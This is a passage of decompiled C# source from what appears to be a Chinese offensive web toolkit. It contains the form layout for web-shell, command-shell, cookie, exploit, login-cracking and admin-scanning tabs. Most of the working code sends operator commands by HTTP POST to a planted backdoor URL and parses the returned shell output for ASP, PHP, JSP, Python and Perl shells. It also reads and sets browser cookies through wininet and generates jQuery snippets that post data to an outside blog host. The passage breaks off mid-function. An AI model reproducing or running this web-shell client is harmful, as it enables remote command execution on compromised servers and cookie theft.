            this.icoBtn_CmdShell.MouseHover += new System.EventHandler(this.icoBtn_CmdShell_MouseHover);
            // 
            // icoBtn_encodeDecode
            // 
            this.icoBtn_encodeDecode.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.icoBtn_encodeDecode.Image = ((System.Drawing.Image)(resources.GetObject("icoBtn_encodeDecode.Image")));
            this.icoBtn_encodeDecode.Location = new System.Drawing.Point(110, 30);
            this.icoBtn_encodeDecode.Name = "icoBtn_encodeDecode";
            this.icoBtn_encodeDecode.Size = new System.Drawing.Size(32, 32);
            this.icoBtn_encodeDecode.TabIndex = 21;
            this.icoBtn_encodeDecode.UseVisualStyleBackColor = true;
            this.icoBtn_encodeDecode.Click += new System.EventHandler(this.icoBtn_encodeDecode_Click);
            this.icoBtn_encodeDecode.MouseHover += new System.EventHandler(this.icoBtn_encodeDecode_MouseHover);
            // 
            // icoBtn_EXploitDB
            // 
            this.icoBtn_EXploitDB.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.icoBtn_EXploitDB.Image = ((System.Drawing.Image)(resources.GetObject("icoBtn_EXploitDB.Image")));
            this.icoBtn_EXploitDB.Location = new System.Drawing.Point(260, 30);
            this.icoBtn_EXploitDB.Name = "icoBtn_EXploitDB";
            this.icoBtn_EXploitDB.Size = new System.Drawing.Size(32, 32);
            this.icoBtn_EXploitDB.TabIndex = 22;
            this.icoBtn_EXploitDB.UseVisualStyleBackColor = true;
            this.icoBtn_EXploitDB.Click += new System.EventHandler(this.icoBtn_EXploitDB_Click);
            this.icoBtn_EXploitDB.MouseHover += new System.EventHandler(this.icoBtn_EXploitDB_MouseHover);
            // 
            // 我在这ToolStripMenuItem
            // 
            this.我在这ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("我在这ToolStripMenuItem.Image")));
            this.我在这ToolStripMenuItem.Name = "我在这ToolStripMenuItem";
            this.我在这ToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
            this.我在这ToolStripMenuItem.Text = "我在这";
            // 
            // lbl_K8Holiday
            // 
            this.lbl_K8Holiday.AutoSize = true;
            this.lbl_K8Holiday.BackColor = System.Drawing.Color.Transparent;
            this.lbl_K8Holiday.Location = new System.Drawing.Point(592, 9);
            this.lbl_K8Holiday.Name = "lbl_K8Holiday";
            this.lbl_K8Holiday.Size = new System.Drawing.Size(65, 12);
            this.lbl_K8Holiday.TabIndex = 23;
            this.lbl_K8Holiday.Text = "K8节日提醒";
            // 
            // imgListWebInfo
            // 
            this.imgListWebInfo.ImageStream = ((System.Windows.Forms.ImageListStreamer)(resources.GetObject("imgListWebInfo.ImageStream")));
            this.imgListWebInfo.TransparentColor = System.Drawing.Color.Transparent;
            this.imgListWebInfo.Images.SetKeyName(0, "电脑.png");
            this.imgListWebInfo.Images.SetKeyName(1, "链条.png");
            this.imgListWebInfo.Images.SetKeyName(2, "cpu2.png");
            this.imgListWebInfo.Images.SetKeyName(3, "bug.png");
            this.imgListWebInfo.Images.SetKeyName(4, "server.png");
            this.imgListWebInfo.Images.SetKeyName(5, "cpu.png");
            this.imgListWebInfo.Images.SetKeyName(6, "save.png");
            this.imgListWebInfo.Images.SetKeyName(7, "set.png");
            this.imgListWebInfo.Images.SetKeyName(8, "user.png");
            this.imgListWebInfo.Images.SetKeyName(9, "加号.png");
            this.imgListWebInfo.Images.SetKeyName(10, "心形加号.png");
            this.imgListWebInfo.Images.SetKeyName(11, "Tomcat.png");
            this.imgListWebInfo.Images.SetKeyName(12, "Apache.png");
            this.imgListWebInfo.Images.SetKeyName(13, "捕获.PNG");
            this.imgListWebInfo.Images.SetKeyName(14, "Nginx.png");
            this.imgListWebInfo.Images.SetKeyName(15, "Tengine.png");
            this.imgListWebInfo.Images.SetKeyName(16, "LiteSpeed.png");
            this.imgListWebInfo.Images.SetKeyName(17, "lighttpd.png");
            this.imgListWebInfo.Images.SetKeyName(18, "OpenGSE.png");
            this.imgListWebInfo.Images.SetKeyName(19, "favicon.ico");
            this.imgListWebInfo.Images.SetKeyName(20, "ss.PNG");
            this.imgListWebInfo.Images.SetKeyName(21, "info_16.png");
            // 
            // icoBtn_ScanAdmin
            // 
            this.icoBtn_ScanAdmin.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.icoBtn_ScanAdmin.Image = ((System.Drawing.Image)(resources.GetObject("icoBtn_ScanAdmin.Image")));
            this.icoBtn_ScanAdmin.Location = new System.Drawing.Point(360, 30);
            this.icoBtn_ScanAdmin.Name = "icoBtn_ScanAdmin";
            this.icoBtn_ScanAdmin.Size = new System.Drawing.Size(32, 32);
            this.icoBtn_ScanAdmin.TabIndex = 24;
            this.icoBtn_ScanAdmin.UseVisualStyleBackColor = true;
            this.icoBtn_ScanAdmin.Click += new System.EventHandler(this.icoBtn_ScanAdmin_Click);
            this.icoBtn_ScanAdmin.MouseHover += new System.EventHandler(this.icoBtn_ScanAdmin_MouseHover);
            // 
            // icoBtn_XssAnalysis
            // 
            this.icoBtn_XssAnalysis.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.icoBtn_XssAnalysis.Image = ((System.Drawing.Image)(resources.GetObject("icoBtn_XssAnalysis.Image")));
            this.icoBtn_XssAnalysis.Location = new System.Drawing.Point(410, 30);
            this.icoBtn_XssAnalysis.Name = "icoBtn_XssAnalysis";
            this.icoBtn_XssAnalysis.Size = new System.Drawing.Size(32, 32);
            this.icoBtn_XssAnalysis.TabIndex = 25;
            this.icoBtn_XssAnalysis.UseVisualStyleBackColor = true;
            this.icoBtn_XssAnalysis.Click += new System.EventHandler(this.icoBtn_XssAnalysis_Click);
            this.icoBtn_XssAnalysis.MouseHover += new System.EventHandler(this.icoBtn_XssAnalysis_MouseHover);
            // 
            // frmMain
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 12F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.Gainsboro;
            this.ClientSize = new System.Drawing.Size(1000, 720);
            this.Controls.Add(this.icoBtn_XssAnalysis);
            this.Controls.Add(this.icoBtn_ScanAdmin);
            this.Controls.Add(this.lbl_K8Holiday);
            this.Controls.Add(this.icoBtn_EXploitDB);
            this.Controls.Add(this.icoBtn_encodeDecode);
            this.Controls.Add(this.icoBtn_CmdShell);
            this.Controls.Add(this.icoBtn_CookieBrowser);
            this.Controls.Add(this.icoBtn_WebShell);
            this.Controls.Add(this.icoBtn_dataOutput);
            this.Controls.Add(this.icoBtn_about);
            this.Controls.Add(this.icoBtn_ExpDebug);
            this.Controls.Add(this.lbl_appTitle);
            this.Controls.Add(this.lbl_AppICO);
            this.Controls.Add(this.tab_MainForm);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Name = "frmMain";
            this.Load += new System.EventHandler(this.frmMain_Load);
            this.tab_MainForm.ResumeLayout(false);
            this.tab_ShellManage.ResumeLayout(false);
            this.rm_ShellMgr.ResumeLayout(false);
            this.tab_SubmitTest.ResumeLayout(false);
            this.tab_SubmitTest.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox12)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox11)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox10)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox9)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox8)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox7)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox6)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox5)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox4)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox3)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pic_server)).EndInit();
            this.rm_CopyDebugInfo.ResumeLayout(false);
            this.tab_EncodeDecode.ResumeLayout(false);
            this.tab_EncodeDecode.PerformLayout();
            this.rm_encodeDecode.ResumeLayout(false);
            this.tab_CookieBrowser.ResumeLayout(false);
            this.tab_CookieBrowser.PerformLayout();
            this.tab_FileManage.ResumeLayout(false);
            this.tab_FileManage.PerformLayout();
            this.tab_CmdShell.ResumeLayout(false);
            this.tab_CmdShell.PerformLayout();
            this.tab_webLoginCrack.ResumeLayout(false);
            this.tab_webLoginCrack.PerformLayout();
            this.tab_ExploitManage.ResumeLayout(false);
            this.tab_ExploitManage.PerformLayout();
            this.rm_ExpMgrInOut.ResumeLayout(false);
            this.tab_DataOutput.ResumeLayout(false);
            this.tab_DataOutput.PerformLayout();
            this.gb_dataOutput.ResumeLayout(false);
            this.gb_dataOutput.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox14)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox13)).EndInit();
            this.tab_ScanAdmin.ResumeLayout(false);
            this.tab_ScanAdmin.PerformLayout();
            this.rm_ScanAdmin.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.tab_googleHackDB.ResumeLayout(false);
            this.groupBox1.ResumeLayout(false);
            this.groupBox1.PerformLayout();
            this.tab_notepad.ResumeLayout(false);
            this.tab_XssAnalysis.ResumeLayout(false);
            this.tab_XssAnalysis.PerformLayout();
            this.gb_xssAnalysis.ResumeLayout(false);
            this.gb_xssAnalysis.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox47)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox48)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox35)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox45)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox46)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox37)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox38)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox39)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox40)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox41)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox42)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox43)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox44)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox36)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox29)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox30)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox31)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox32)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox33)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox34)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox23)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox24)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox25)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox26)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox27)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox28)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox22)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox20)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox21)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox18)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox19)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox17)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox16)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox15)).EndInit();
            this.tab_Introduction.ResumeLayout(false);
            this.tab_Introduction.PerformLayout();
            this.rm_ExpMgrBtn.ResumeLayout(false);
            this.rm_appFunction.ResumeLayout(false);
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        public void IniWriteValue(string Section, string Key, string Value, string filepath)
        {
            WritePrivateProfileString(Section, Key, Value, filepath);
        }

        [DllImport("wininet.dll", CharSet=CharSet.Auto, SetLastError=true)]
        public static extern bool InternetGetCookie(string lpszUrlName, string lbszCookieName, StringBuilder lpszCookieData, ref int lpdwSize);
        [DllImport("wininet.dll", CharSet=CharSet.Auto, SetLastError=true)]
        private static extern bool InternetGetCookieEx(string pchURL, string pchCookieName, StringBuilder pchCookieData, ref uint pcchCookieData, int dwFlags, IntPtr lpReserved);
        [DllImport("wininet.dll", CharSet=CharSet.Auto, SetLastError=true)]
        public static extern bool InternetSetCookie(string lpszUrlName, string lbszCookieName, string lpszCookieData);
        [DllImport("wininet.dll", CharSet=CharSet.Auto, SetLastError=true)]
        private static extern int InternetSetCookieEx(string lpszURL, string lpszCookieName, string lpszCookieData, int dwFlags, IntPtr dwReserved);
        private void introductionToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.icoBtn_about_Click(null, null);
        }

        private void IsCheckScriptType()
        {
            string input = this.txt_OneShellPath.Text.Trim();
            Regex regex = new Regex(@"([.\S\s]*)(?=[.][p][h][p]$)");
            Regex regex2 = new Regex(@"([.\S\s]*)(?=[.][p][h][p][2]$)");
            Regex regex3 = new Regex(@"([.\S\s]*)(?=[.][p][h][p][3]$)");
            Regex regex4 = new Regex(@"([.\S\s]*)(?=[.][p][h][p][4]$)");
            Regex regex5 = new Regex(@"([.\S\s]*)(?=[.][p][h][p][5]$)");
            Regex regex6 = new Regex(@"([.\S\s]*)(?=[.][s][q][l]$)");
            Regex regex7 = new Regex(@"([.\S\s]*)(?=[.][a][s][p][x]$)");
            Regex regex8 = new Regex(@"([.\S\s]*)(?=[.][a][s][h][x]$)");
            Regex regex9 = new Regex(@"([.\S\s]*)(?=[.][a][s][c][x]$)");
            Regex regex10 = new Regex(@"([.\S\s]*)(?=[.][a][s][p]$)");
            Regex regex11 = new Regex(@"([.\S\s]*)(?=[.][a][s][a]$)");
            Regex regex12 = new Regex(@"([.\S\s]*)(?=[.][c][e][r]$)");
            Regex regex13 = new Regex(@"([.\S\s]*)(?=[.][j][p][g]$)");
            Regex regex14 = new Regex(@"([.\S\s]*)(?=[.][g][i][f]$)");
            Regex regex15 = new Regex(@"([.\S\s]*)(?=[.][j][s][p]$)");
            Regex regex16 = new Regex(@"([.\S\s]*)(?=[.][j][s][p][x]$)");
            Regex regex17 = new Regex(@"([.\S\s]*)(?=[.][d][o]$)");
            Regex regex18 = new Regex(@"([.\S\s]*)(?=[.][a][c][t][i][o][n]$)");
            Regex regex19 = new Regex(@"([.\S\s]*)(?=[.][j][s][f]$)");
            Regex regex20 = new Regex(@"([.\S\s]*)(?=[.][c][f][m]$)");
            Regex regex21 = new Regex(@"([.\S\s]*)(?=[.][p][y]$)");
            Regex regex22 = new Regex(@"([.\S\s]*)(?=[.][p][l]$)");
            Regex regex23 = new Regex(@"([.\S\s]*)(?=[.][r][b]$)");
            Regex regex24 = new Regex(@"([.\S\s]*)(?=[.][c][g][i]$)");
            input = input.ToLower();
            if ((regex7.IsMatch(input) | regex8.IsMatch(input)) | regex9.IsMatch(input))
            {
                this.rb_aspxCmd.Checked = true;
            }
            if (((((regex.IsMatch(input) | regex2.IsMatch(input)) | regex3.IsMatch(input)) | regex4.IsMatch(input)) | regex5.IsMatch(input)) | regex6.IsMatch(input))
            {
                this.rb_phpCmd.Checked = true;
            }
            if ((((regex10.IsMatch(input) | regex11.IsMatch(input)) | regex12.IsMatch(input)) | regex13.IsMatch(input)) | regex14.IsMatch(input))
            {
                this.rb_aspCmd.Checked = true;
            }
            if ((((regex15.IsMatch(input) | regex17.IsMatch(input)) | regex18.IsMatch(input)) | regex16.IsMatch(input)) | regex19.IsMatch(input))
            {
                this.rb_jspCmd.Checked = true;
            }
            if (regex20.IsMatch(input))
            {
                this.rb_cfmCmd.Checked = true;
            }
            if (regex21.IsMatch(input))
            {
                this.rb_pythonCmd.Checked = true;
            }
            if (regex22.IsMatch(input))
            {
                this.rb_perlCmd.Checked = true;
            }
            if (regex23.IsMatch(input))
            {
                this.rb_rubyCmd.Checked = true;
            }
            if (regex24.IsMatch(input))
            {
                this.rb_cgiCmd.Checked = true;
            }
        }

        private void jQueryPost参数Post参数ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Copy();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                StringBuilder builder = new StringBuilder();
                builder.Append("密文(Post参数)：\r\n\r\n");
                builder.Append(K8crack.FlashPostDecode(str));
                string str2 = "\r\n原文：\t\r\n" + str + "\r\n\r\n" + builder.ToString();
                this.txt_EncodeDecodeText.AppendText("\r\n\r\n" + this.k8encodeSplit + str2 + "\r\n\r\n" + this.k8encodeSplit);
            }
        }

        private void jQueryPost代码post参数ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Copy();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                StringBuilder builder = new StringBuilder();
                builder.Append("密文(jQuery Post提交代码)：\r\n\r\n");
                builder.Append("<script src=\"Scripts/jquery-1.4.1.min.js\" type=\"text/javascript\"></script>\r\n");
                builder.Append("<script type=\"text/javascript\">\r\n");
                builder.Append("     $(function () {\r\n");
                builder.Append("\t\t\r\n");
                builder.Append("\t$.post(\"http://qqhack8.blog.163.com/post.php\", { " + K8crack.jqueryPostEncode(str) + "});\r\n");
                builder.Append("  \r\n");
                builder.Append("\t});\r\n");
                builder.Append("</script>\r\n");
                string str2 = "\r\n原文：\t" + str + "\r\n\r\n" + builder.ToString();
                this.txt_EncodeDecodeText.AppendText("\r\n\r\n" + this.k8encodeSplit + str2 + "\r\n\r\n" + this.k8encodeSplit);
            }
        }

        private void jQueryPost代码post参数ToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Copy();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                string str2 = "";
                str2 = "密文(jQuery Post参数)：\r\n\r\n" + K8crack.jqueryPostEncode(str) + "\r\n\r\n";
                this.txt_EncodeDecodeText.AppendText("\r\n\r\n" + this.k8encodeSplit + "\r\n\r\n" + str2 + this.k8encodeSplit);
            }
        }

        private void jSEscapeALLToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.K8JSescapeAll(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void jSEscapeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.K8JSescape(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void jSHexStringToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.str2JSstringHex(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void jSUnicodeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.Str2JS_Unicode(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void K8_BtnExecuteCmd(string K8Commond)
        {
            Thread thread = new Thread(() => this.K8ExecuteWebCmd(K8Commond, 1));
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }

        private void K8_EnterExecuteCMD(string K8Commond)
        {
            Thread thread = new Thread(() => this.K8ExecuteWebCmd(K8Commond, 2));
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }

        private void K8_PostExecuteCMD(string OnePostData, int k8type)
        {
            this.txt_WebCmdResult.AppendText("\r\n请稍候...");
            ServicePointManager.ServerCertificateValidationCallback = new System.Net.Security.RemoteCertificateValidationCallback(this.RemoteCertificateValidationCallback);
            new X509Store(StoreName.My, StoreLocation.CurrentUser).Open(OpenFlags.OpenExistingOnly);
            string requestUriString = this.txt_OneShellPath.Text.Trim();
            if (requestUriString == "")
            {
                this.K8msgbox("请先输入目标网址!");
            }
            else
            {
                Exception exception;
                if (!requestUriString.Contains("http://") & !requestUriString.Contains("https://"))
                {
                    requestUriString = "http://" + requestUriString;
                }
                HttpWebResponse response = null;
                int statusCode = 0;
                try
                {
                    HttpWebResponse response2;
                    HttpWebRequest request = null;
                    try
                    {
                        request = (HttpWebRequest) WebRequest.Create(requestUriString);
                    }
                    catch (Exception exception1)
                    {
                        exception = exception1;
                        this.K8msgbox(exception.Message);
                        this.txt_WebCmdResult.Text = this.txt_WebCmdResult.Text.Substring(0, this.txt_WebCmdResult.Text.Length - 6);
                        return;
                    }
                    request.Accept = "application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*";
                    request.Referer = requestUriString;
                    request.ContentType = "application/x-www-form-urlencoded";
                    request.UserAgent = this.txt_UserAgent.Text;
                    request.KeepAlive = true;
                    request.Timeout = int.Parse(this.txt_TimeOutCmd.Text);
                    request.ProtocolVersion = HttpVersion.Version10;
                    request.Method = "POST";
                    byte[] bytes = new ASCIIEncoding().GetBytes(OnePostData);
                    request.ContentLength = bytes.Length;
                    Stream requestStream = request.GetRequestStream();
                    requestStream.Write(bytes, 0, bytes.Length);
                    requestStream.Close();
                    try
                    {
                        response2 = (HttpWebResponse) request.GetResponse();
                    }
                    catch (WebException exception2)
                    {
                        response2 = (HttpWebResponse) exception2.Response;
                        this.K8msgbox("异常：" + Convert.ToString((int) response2.StatusCode));
                    }
                    string input = "";
                    StreamReader reader = new StreamReader(response2.GetResponseStream(), Encoding.GetEncoding(int.Parse(this.K8ExecuteCmdCoding())));
                    string str3 = "";
                    string str4 = "";
                    while ((str3 = reader.ReadLine()) != null)
                    {
                        str4 = str4 + str3 + "\r\n";
                    }
                    input = "\r\n\r\n" + str4.Trim();
                    reader.Close();
                    if (k8type == 0)
                    {
                        Regex regex;
                        Match match;
                        this.txt_WebCmdResult.Text = this.txt_WebCmdResult.Text.Substring(0, this.txt_WebCmdResult.Text.Length - 6);
                        if (this.rb_aspCmd.Checked | this.rb_aspxCmd.Checked)
                        {
                            regex = new Regex(@"(?<=[-][>][|])[^\[\]]+(?=\t)");
                            match = regex.Match(input);
                            this.WebCurPath = match.Value.Trim();
                        }
                        else if (this.rb_phpCmd.Checked)
                        {
                            regex = new Regex(@"(?<=[-][>][|])([.\S\s]*)(?=\t)");
                            match = regex.Match(input);
                            this.WebCurPath = Search_string(input, "->|", "\t");
                        }
                        else if (this.rb_jspCmd.Checked)
                        {
                            regex = new Regex(@"(?<=[-][>][|])([.\S\s]*)(?=\t)");
                            match = regex.Match(input);
                            this.WebCurPath = Search_string(input, "[S]", "[E]");
                        }
                        else if (this.rb_cfmCmd.Checked)
                        {
                            regex = new Regex(@"(?<=[-][>][|])[^\[\]]+(?=\t)");
                            match = regex.Match(input);
                            this.WebCurPath = match.Value.Trim();
                        }
                        else if (this.rb_pythonCmd.Checked)
                        {
                            regex = new Regex(@"(?<=[-][>][|])([.\S\s]*)(?=\t)");
                            match = regex.Match(input);
                            this.WebCurPath = Search_string(input, "[S]", "[E]");
                        }
                        else if (this.rb_perlCmd.Checked)
                        {
                            match = new Regex(@"(?<=[-][>][|])([.\S\s]*)(?=\t)").Match(input);
                            this.WebCurPath = Search_string(input, "[S]", "[E]");
                        }
                        if (this.WebCurPath != "")
                        {
                            this.btn_ExecuteWebCMD.Enabled = true;
                            this.txt_WebCmdResult.Enabled = true;
                            this.txt_WebCmdResult.AppendText("\r\n后门地址: " + this.txt_OneShellPath.Text.Trim() + "\r\n");
                            this.txt_WebCmdResult.AppendText("\r\n" + this.WebCurPath + ">");
                        }
                        else
                        {
                            this.btn_ExecuteWebCMD.Enabled = false;
                            this.txt_WebCmdResult.Enabled = false;
                            this.txt_WebCmdResult.AppendText("\r\nK8连接失败!");
                        }
                    }
                    else if (k8type == 1)
                    {
                        string str5 = "\r\n\r\n============================================================================================================r\n\r\n";
                        string str6 = Search_string(input, "->|", "|<-");
                        string str7 = "";
                        string str8 = "";
                        if (((this.rb_aspCmd.Checked | this.rb_phpCmd.Checked) | this.rb_aspxCmd.Checked) | this.rb_cfmCmd.Checked)
                        {
                            str8 = Search_string(input, "->|", "[S]");
                            this.WebCurPath = Search_string(input, "[S]\r\n", "\r\n[E]");
                            str7 = str8 + "\r\n" + this.WebCurPath + ">";
                        }
                        else if (this.rb_jspCmd.Checked)
                        {
                            str7 = Search_string(input, "->|", "|<-") + "\r\n" + this.WebCurPath + ">";
                        }
                        else if (this.rb_pythonCmd.Checked)
                        {
                            str7 = Search_string(input, "->|", "|<-") + "\r\n" + this.WebCurPath + ">";
                        }
                        else if (this.rb_perlCmd.Checked)
                        {
                            str7 = Search_string(input, "->|", "|<-") + "\r\n" + this.WebCurPath + ">";
                        }
                        if (input.Contains("ERROR://"))
                        {
                            this.txt_WebCmdResult.Text = this.txt_WebCmdResult.Text.Substring(0, this.txt_WebCmdResult.Text.Length - 6);
                            this.txt_WebCmdResult.AppendText("\r\n" + str5 + str6 + str5 + this.WebCurPath + ">");
                        }
                        else
                        {
                            string str9 = input.Trim().ToUpper();
                            if (((str9.Contains("此命令的语法是") | str9.Contains("不是内部或外部命令")) | str9.Contains("net helpmsg")) | str9.Contains("拒绝访问"))
                            {
                                this.txt_WebCmdResult.Text = this.txt_WebCmdResult.Text.Substring(0, this.txt_WebCmdResult.Text.Length - 6);
                                this.txt_WebCmdResult.AppendText(str6 + str5 + this.WebCurPath + ">");
                            }
                            else if ((str9.Contains("is not recognized as an internal or external command") | str9.Contains("the syntax of this command is")) | str9.Contains("access is denied"))
                            {
                                this.txt_WebCmdResult.Text = this.txt_WebCmdResult.Text.Substring(0, this.txt_WebCmdResult.Text.Length - 6);
                                this.txt_WebCmdResult.AppendText(str6 + str5 + this.WebCurPath + ">");
                            }
                            else
                            {
                                this.txt_WebCmdResult.Text = this.txt_WebCmdResult.Text.Substring(0, this.txt_WebCmdResult.Text.Length - 6);
                                this.txt_WebCmdResult.AppendText(str5 + str7);
                            }
                        }
                    }
                }
                catch (WebException exception3)
                {
                    this.txt_WebCmdResult.Text = this.txt_WebCmdResult.Text.Substring(0, this.txt_WebCmdResult.Text.Length - 6);
                    response = (HttpWebResponse) exception3.Response;
                    if (response != null)
                    {
                        statusCode = (int) response.StatusCode;
                    }
                    if (statusCode != 200)
                    {
                        this.K8msgbox(statusCode.ToString());
                    }
                }
                catch (Exception exception6)
                {
                    exception = exception6;
                    this.txt_WebCmdResult.Text = this.txt_WebCmdResult.Text.Substring(0, this.txt_WebCmdResult.Text.Length - 6);
                    if (k8type == 0)
                    {
                        if (exception.ToString().Contains("(500) 内部服务器错误") | exception.ToString().Contains("(500) Internal Server Error"))
                        {
                            this.txt_WebCmdResult.AppendText("\r\nK8连接失败!\r\n\r\n1 密码错误");
                        }
                        else
                        {
                            this.txt_WebCmdResult.AppendText("\r\n没有返回内容");
                        }
                    }
                    else if ((k8type == 1) && exception.ToString().Contains("操作超时"))
                    {
                        this.txt_WebCmdResult.AppendText("\r\nK8操作超时");
                    }
                }
            }
        }

        private void K8_PostFileManage(string OnePostData, int k8type)
        {
            this.txt_WebCmdResult.AppendText("\r\n请稍候...");
            ServicePointManager.ServerCertificateValidationCallback = new System.Net.Security.RemoteCertificateValidationCallback(this.RemoteCertificateValidationCallback);
            new X509Store(StoreName.My, StoreLocation.CurrentUser).Open(OpenFlags.OpenExistingOnly);
            string requestUriString = this.txt_OneShellPath.Text.Trim();
            if (requestUriString == "")
            {
                this.K8msgbox("请先输入目标网址!");
            }
            else
            {
                Exception exception;
                if (!requestUriString.Contains("http://") & !requestUriString.Contains("https://"))
                {
                    requestUriString = "http://" + requestUriString;
                }
                HttpWebResponse response = null;
                int statusCode = 0;
                try
                {
                    HttpWebResponse response2;
                    HttpWebRequest request = null;
                    try
                    {
                        request = (HttpWebRequest) WebRequest.Create(requestUriString);
                    }
                    catch (Exception exception1)
                    {
                        exception = exception1;
                        this.K8msgbox(exception.Message);
                        this.txt_WebCmdResult.Text = this.txt_WebCmdResult.Text.Substring(0, this.txt_WebCmdResult.Text.Length - 6);
                        return;
                    }
                    request.Accept = "application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*";
                    request.Referer = requestUriString;
                    request.ContentType = "application/x-www-form-urlencoded";
                    request.UserAgent = this.txt_UserAgent.Text;
                    request.KeepAlive = true;
